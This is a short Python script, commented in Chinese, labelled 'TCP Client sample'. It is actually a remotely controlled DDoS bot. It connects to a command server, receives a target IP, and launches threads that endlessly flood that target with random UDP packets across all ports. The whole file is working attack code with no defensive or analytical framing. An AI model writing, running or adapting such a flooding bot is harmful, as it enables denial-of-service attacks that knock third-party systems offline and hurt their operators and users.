#!/usr/bin/python
#coding=UTF-8

"""
TCP Client sample
"""

import socket
import threading
import sys
import random
import os
import time
target_host = "127.0.0.1"
target_port = 8787
s = ""

def ddos_attack(attack_ip): #DOS攻擊
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #ipv4,UDP
    bytes = random._urandom(1450) #隨機封包大小
    os.system('clear')
    print('Now start attack')
    a_send = 0  #send計數
    a_port = 0  #port 0~65535
    while True:
        s.sendto(bytes, (attack_ip,a_port)) #送出UDP封包
        a_send = a_send + 1     #a_send++
        a_port = a_port + 1     #a_port++
        print ("Sent ", a_send ," packet to ", attack_ip ,"throught port:",a_port)
        if (a_port==65535):     #a_port = 0~65535
            a_port = 1

# create socket
# AF_INET 代表使用標準 IPv4 位址或主機名稱
# SOCK_STREAM 代表這會是一個 TCP client
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# client 建立連線
while True:
    try:
        client.connect((target_host, target_port))
        print('連線成功,5s後開始攻擊')
        time.sleep(5)
        break

    except Exception as e:
        print('連接錯誤,10s後重新連接')
        time.sleep(10)
        #sys.exit(0)

print('與',target_host,':',target_port,'建立連線')

response = client.recv(1024) #接收attack ip
print('收到待攻擊ip:',str(response)[2:-1])
attack_ip = str(response)[2:-1]

s = '攻擊開始'
client.send(s.encode('utf-8'))

while True:
    # 傳送資料給 target
        #input(s)
    for i in range(1,2):
        ddos_attack_thread = threading.Thread(target=ddos_attack,args=(attack_ip,))
        ddos_attack_thread.start()
    #ddos_attack(attack_ip)

# 接收資料
    response = client.recv(1024)
# 印出資料信息
    print(str(response))
